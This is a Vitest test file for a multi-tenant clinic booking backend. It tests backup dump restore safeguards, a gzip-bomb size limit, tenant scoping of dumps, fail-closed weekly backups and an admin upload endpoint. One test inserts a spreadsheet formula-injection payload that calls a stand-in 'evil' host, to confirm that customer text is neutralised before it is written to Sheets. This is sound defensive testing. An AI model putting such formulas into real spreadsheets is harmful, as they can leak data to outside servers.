import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'fs';
import path from 'path';
import zlib from 'zlib';
import crypto from 'crypto';
import { prisma } from '../../src/db/client';
import { buildApp } from '../../src/app';
import { backupService } from '../../src/services/backup.service';
import { cronService } from '../../src/services/cron.service';
import { sheetsSyncService } from '../../src/services/sheets/sheets-sync.service';
import { formatReservationToRow } from '../../src/services/sheets/row-formatter';
import { BACKUP_STORAGE_DIR } from '../../src/utils/backup-file';

const TEST_TENANT = 'tenant-f4-test';

function writeDump(name: string, payload: any): string {
  fs.mkdirSync(BACKUP_STORAGE_DIR, { recursive: true });
  const filePath = path.join(BACKUP_STORAGE_DIR, name);
  fs.writeFileSync(filePath, zlib.gzipSync(Buffer.from(JSON.stringify(payload))));
  return filePath;
}

describe('F4 — backup, restore, sheets', () => {
  beforeEach(() => {
    process.env.BACKUP_ENCRYPTION_KEY = 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2';
    process.env.ADMIN_API_KEY = 'test_admin_key_f4';
  });

  afterEach(() => {
    vi.restoreAllMocks();
    delete process.env.BACKUP_MAX_RESTORE_BYTES;
  });

  it('restore melaporkan gagal saat DB offline (tidak ada sukses palsu)', async () => {
    const filePath = writeDump('f4_restore_offline.json.gz', {
      meta: { exportedAt: new Date().toISOString() },
      tables: { customers: [{ id: 'c1', tenant_id: TEST_TENANT, name: 'A', phone: '628111' }] },
    });
    try {
      const result = await backupService.restoreDatabaseFromDump(filePath, TEST_TENANT);
      expect(result.success).toBe(false);
      expect(result.message).toMatch(/Restore sebagian|Restore gagal/);
    } finally {
      fs.unlinkSync(filePath);
    }
  });

  it('gzip bomb ditolak saat dekompresi restore', async () => {
    process.env.BACKUP_MAX_RESTORE_BYTES = '1024';
    const filePath = writeDump('f4_gzip_bomb.json.gz', {
      meta: { exportedAt: new Date().toISOString() },
      tables: { customers: [{ id: 'c1', tenant_id: TEST_TENANT, name: 'a'.repeat(5000), phone: '628111' }] },
    });
    try {
      await expect(backupService.restoreDatabaseFromDump(filePath, TEST_TENANT)).rejects.toThrow();
      expect(backupService.getBackupFileCounts(filePath)).toBeNull();
    } finally {
      fs.unlinkSync(filePath);
    }
  });

  it('dump tenant memfilter tenant_id; dump global tidak', async () => {
    const models = [
      'customer',
      'child',
      'reservation',
      'reservationArchive',
      'clinicService',
      'deliveryTier',
      'staff',
      'tenantPersona',
      'tenantAiConfig',
      'knowledgeChunk',
      'conversation',
      'message',
    ];
    for (const model of models) {
      vi.spyOn((prisma as any)[model], 'findMany').mockResolvedValue([]);
    }
    const findMany = vi.mocked((prisma as any).customer.findMany);

    const tenantDump = await backupService.createDatabaseDump(TEST_TENANT);
    expect(findMany).toHaveBeenLastCalledWith({ where: { tenant_id: TEST_TENANT } });

    const globalDump = await backupService.createDatabaseDump(TEST_TENANT, { scope: 'global' });
    expect(findMany).toHaveBeenLastCalledWith(undefined);

    for (const d of [tenantDump, globalDump]) {
      try {
        fs.unlinkSync(d.filePath);
      } catch {}
    }
  });

  it('dump global tidak dapat direstore lewat endpoint tenant', async () => {
    const filePath = writeDump('f4_global_scope.json.gz', {
      meta: { exportedAt: new Date().toISOString(), tenantId: TEST_TENANT, scope: 'global' },
      tables: { customers: [{ id: 'c1', tenant_id: TEST_TENANT, name: 'A', phone: '628111' }] },
    });
    try {
      await expect(backupService.restoreDatabaseFromDump(filePath, TEST_TENANT)).rejects.toThrow(
        /scope=global|Dump global/i
      );
    } finally {
      fs.unlinkSync(filePath);
    }
  });

  it('teks pelanggan dinetralkan dari formula Sheets', () => {
    const row = formatReservationToRow({
      reservation: {
        booking_date: new Date('2026-11-27T02:00:00Z'),
        treatment_detail: '+1+1',
        purchase_value: 100000,
      } as any,
      customer: { name: '=IMPORTXML("http://evil","//x")', kelurahan: '@SUM(1)' } as any,
      child: { name: '-2+3', raw_age_text: '1 tahun' } as any,
    });

    expect(String(row[2]).startsWith("'=")).toBe(true);
    expect(String(row[3]).startsWith("'@")).toBe(true);
    expect(String(row[6]).startsWith("'+")).toBe(true);
  });

  it('klaim backup mingguan fail-closed saat DB tidak bisa dipastikan', async () => {
    vi.mocked(prisma.adminNotificationLog.create).mockRejectedValue(new Error('db down'));
    vi.mocked(prisma.adminNotificationLog.findFirst).mockRejectedValue(new Error('db down'));
    const dumpSpy = vi.spyOn(backupService, 'createDatabaseDump').mockResolvedValue({} as any);

    const result = await cronService.runWeeklyBackup(TEST_TENANT);
    expect(result.success).toBe(false);
    expect(result.error).toBe('BACKUP_CLAIM_UNAVAILABLE');
    expect(dumpSpy).not.toHaveBeenCalled();
  });

  it('requeueFailed mengembalikan baris failed ke pending', async () => {
    const updateMany = vi.mocked((prisma as any).sheetsSyncOutbox.updateMany);
    updateMany.mockResolvedValue({ count: 3 });

    const count = await sheetsSyncService.requeueFailed(TEST_TENANT);
    expect(count).toBe(3);
    expect(updateMany).toHaveBeenCalledWith(
      expect.objectContaining({
        where: { tenant_id: TEST_TENANT, status: 'failed' },
        data: expect.objectContaining({ status: 'pending', attempts: 0 }),
      })
    );
  });

  it('upload-file menolak dump plaintext dan menulis atomik', async () => {
    const app = buildApp();
    const res = await app.inject({
      method: 'POST',
      url: '/api/admin/backup/upload-file',
      headers: { 'x-api-key': 'test_admin_key_f4', 'x-tenant-id': TEST_TENANT },
      payload: {
        fileName: 'f4_plain.json.gz',
        fileBase64: Buffer.from('bukan gzip').toString('base64'),
      },
    });
    expect(res.statusCode).toBe(400);
    expect(fs.existsSync(path.join(BACKUP_STORAGE_DIR, 'f4_plain.json.gz'))).toBe(false);
    await app.close();
  });

  it('upload-file menerima gzip dan menolak menimpa file yang ada', async () => {
    const app = buildApp();
    const name = `f4_ok_${crypto.randomUUID()}.json.gz`;
    const payload = zlib.gzipSync(Buffer.from(JSON.stringify({ hello: 'world' }))).toString('base64');

    const first = await app.inject({
      method: 'POST',
      url: '/api/admin/backup/upload-file',
      headers: { 'x-api-key': 'test_admin_key_f4', 'x-tenant-id': TEST_TENANT },
      payload: { fileName: name, fileBase64: payload },
    });
    expect(first.statusCode).toBe(200);

    const second = await app.inject({
      method: 'POST',
      url: '/api/admin/backup/upload-file',
      headers: { 'x-api-key': 'test_admin_key_f4', 'x-tenant-id': TEST_TENANT },
      payload: { fileName: name, fileBase64: payload },
    });
    expect(second.statusCode).toBe(409);

    try {
      fs.unlinkSync(path.join(BACKUP_STORAGE_DIR, name));
    } catch {}
    await app.close();
  });
});
